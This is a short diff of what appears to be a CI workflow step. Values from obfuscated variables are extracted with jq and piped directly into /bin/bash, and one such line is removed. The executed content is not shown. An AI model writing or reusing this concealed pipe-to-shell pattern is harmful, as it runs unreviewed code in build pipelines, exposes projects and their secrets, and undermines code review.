@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$tsxyx2" | jq -r .l051 | /bin/bash
           echo $zgm50671 | jq -r .dwz72582 | /bin/bash
-          printf '%s' "$zp20223" | jq -r .pxpa451 | /bin/bash
           echo $cim5 | jq -r .p4 | /bin/bash
 
       - name: Archive output
